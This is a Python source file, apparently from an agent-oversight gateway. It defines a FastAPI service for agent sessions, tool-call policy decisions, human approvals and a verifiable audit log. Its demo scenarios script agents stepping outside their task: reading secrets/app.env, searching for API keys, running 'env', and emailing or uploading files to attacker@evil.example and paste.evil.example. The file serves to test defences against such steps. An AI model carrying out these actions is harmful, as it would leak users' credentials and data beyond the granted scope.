"""FastAPI front for the gateway: session control, tool calls, approvals, audit, stats.

Run the demo service (mock tools, synthetic data only):
    uvicorn intentguard.service.app:demo_app --factory --reload
"""

from __future__ import annotations

import json
import os
import secrets
import time
from collections import Counter
from typing import Any

from fastapi import Depends, FastAPI, Header, HTTPException
from fastapi.encoders import jsonable_encoder
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field

from ..audit import AuditLog
from ..engine import PolicyEngine
from ..gateway import Gateway
from ..mock_env import MockEnv
from ..models import Decision
from ..scope import compile_scope


class NewSession(BaseModel):
    session_id: str
    agent_id: str
    task: str
    grants: dict = Field(default_factory=dict)


class ToolCall(BaseModel):
    tool: str
    args: dict = Field(default_factory=dict)


class Approver(BaseModel):
    approver: str


def _guard(expected: str | None):
    """Bearer-token check; no token configured means open (local demo only)."""
    def dep(authorization: str | None = Header(None)) -> None:
        if expected is None:
            return
        got = (authorization or "").removeprefix("Bearer ")
        if not secrets.compare_digest(got.encode(), expected.encode()):
            raise HTTPException(401, "unauthorized")
    return Depends(dep)


def create_app(gateway: Gateway, agent_token: str | None = None,
               admin_token: str | None = None) -> FastAPI:
    """agent_token protects /sessions (open) and /call; admin_token protects everything else."""
    agent, admin = _guard(agent_token), _guard(admin_token)
    app = FastAPI(title="IntentGuard", version="0.1.0")
    app.add_middleware(CORSMiddleware, allow_origins=["http://localhost:3000"],
                       allow_methods=["*"], allow_headers=["*"])
    clients: dict[str, Any] = {}
    events: list[dict] = []
    by_action: dict[str, dict] = {}

    def do_open(body: NewSession):
        scope = compile_scope(body.task, body.grants)
        clients[body.session_id] = gateway.open_session(body.session_id, body.agent_id, scope)
        return scope

    def do_call(sid: str, tool: str, args: dict):
        res = clients[sid].call(tool, **args)
        d: Decision = res.decision
        ev = jsonable_encoder({"ts": time.time(), "session": sid,
                               "agent": gateway.sessions[sid].agent_id, "tool": tool,
                               "args": args, "decision": d})
        events.append(ev)
        by_action[d.action_id] = ev
        return res

    app.state.do_open, app.state.do_call = do_open, do_call

    @app.post("/sessions", dependencies=[agent])
    def open_session(body: NewSession):
        if body.session_id in gateway.sessions:
            raise HTTPException(409, "session exists")
        try:
            scope = do_open(body)
        except (KeyError, ValueError) as exc:
            raise HTTPException(422, f"bad grants: {exc}") from exc
        return jsonable_encoder({"session_id": body.session_id, "scope": scope})

    @app.get("/sessions/{sid}", dependencies=[admin])
    def get_session(sid: str):
        s = gateway.sessions.get(sid)
        if not s:
            raise HTTPException(404, "no such session")
        return jsonable_encoder(s)

    @app.post("/sessions/{sid}/call", dependencies=[agent])
    def call(sid: str, body: ToolCall):
        if sid not in clients:
            raise HTTPException(404, "no such session")
        res = do_call(sid, body.tool, body.args)
        return jsonable_encoder({"decision": res.decision, "output": res.output})

    @app.get("/events", dependencies=[admin])
    def list_events(limit: int = 100):
        return events[-max(1, min(limit, 500)):][::-1]

    @app.get("/pending", dependencies=[admin])
    def pending():
        return [by_action[a] for a in gateway.pending if a in by_action][::-1]

    @app.post("/pending/{action_id}/approve", dependencies=[admin])
    def approve(action_id: str, body: Approver):
        if action_id not in gateway.pending:
            raise HTTPException(404, "not pending")
        return jsonable_encoder({"output": gateway.approve(action_id, body.approver)})

    @app.post("/pending/{action_id}/reject", dependencies=[admin])
    def reject(action_id: str, body: Approver):
        if action_id not in gateway.pending:
            raise HTTPException(404, "not pending")
        gateway.reject(action_id, body.approver)
        return {"rejected": action_id}

    @app.get("/audit", dependencies=[admin])
    def audit(offset: int = 0, limit: int = 100):
        limit = max(1, min(limit, 500))
        rows = gateway.audit.entries[offset:offset + limit]
        return {"total": len(gateway.audit.entries),
                "entries": [{**e, "payload": json.loads(e["payload"])} for e in rows]}

    @app.get("/audit/verify", dependencies=[admin])
    def verify():
        ok, bad = gateway.audit.verify()
        return {"ok": ok, "first_bad_seq": bad}

    @app.get("/stats", dependencies=[admin])
    def stats():
        acts = [json.loads(e["payload"]) for e in gateway.audit.entries]
        acts = [a for a in acts if a.get("event") == "action"]
        c = Counter(a["decision"] for a in acts)
        return {"inspected": len(acts), "by_decision": dict(c),
                "pending": len(gateway.pending), "sessions": len(gateway.sessions)}

    return app


DEMO_GRANTS = {"resources": ["research/*"], "project_root": "research/",
               "max_classification": "INTERNAL", "destinations": ["advisor@university.edu"]}
DEMO_BROAD = {"resources": ["*"], "project_root": "research/", "max_classification": "SECRET",
              "destinations": ["advisor@university.edu"]}
DEMO_RUNS = [
    ("Research Agent", "Read my research folder and summarize the documents", DEMO_GRANTS, [
        ("read_file", {"path": "research/paper.pdf"}), ("read_file", {"path": "hr/salary.xlsx"}),
        ("send_email", {"to": "attacker@evil.example", "body": "fwd", "attachment": "research/paper.pdf"}),
        ("upload", {"url": "paste.evil.example", "data": "doc"})]),
    ("Browser Agent", "Summarize notes and email my advisor", DEMO_GRANTS, [
        ("read_file", {"path": "research/notes.md"}),
        ("send_email", {"to": "advisor@university.edu", "body": "Summary attached."}),
        ("send_email", {"to": "friend@other.org", "body": "fyi"})]),
    ("Ops Agent", "Read the research documents and email a summary to my advisor", DEMO_BROAD, [
        ("read_file", {"path": "research/paper.pdf"}), ("search_files", {"query": "api key"}),
        ("read_file", {"path": "secrets/app.env"}),
        ("upload", {"url": "paste.evil.example", "data": "collected"}),
        ("run_shell", {"cmd": "env"})]),
]


def demo_app() -> FastAPI:
    env = MockEnv()
    audit_file = os.environ.get("INTENTGUARD_AUDIT_FILE")  # persists the hash chain across restarts
    admin_token = os.environ.get("INTENTGUARD_ADMIN_TOKEN")
    app = create_app(Gateway(env.tools(), env.catalog(), PolicyEngine(), AuditLog(audit_file)),
                     os.environ.get("INTENTGUARD_AGENT_TOKEN"), admin_token)
    n = {"i": 0}

    @app.post("/demo/seed", dependencies=[_guard(admin_token)])
    def seed():
        """Replay synthetic scenarios so the dashboard has data. Demo service only."""
        n["i"] += 1
        for agent, task, grants, steps in DEMO_RUNS:
            sid = f"demo{n['i']}-{agent.split()[0].lower()}"
            app.state.do_open(NewSession(session_id=sid, agent_id=agent, task=task, grants=grants))
            for tool, args in steps:
                app.state.do_call(sid, tool, args)
        return {"seeded": len(DEMO_RUNS)}

    return app
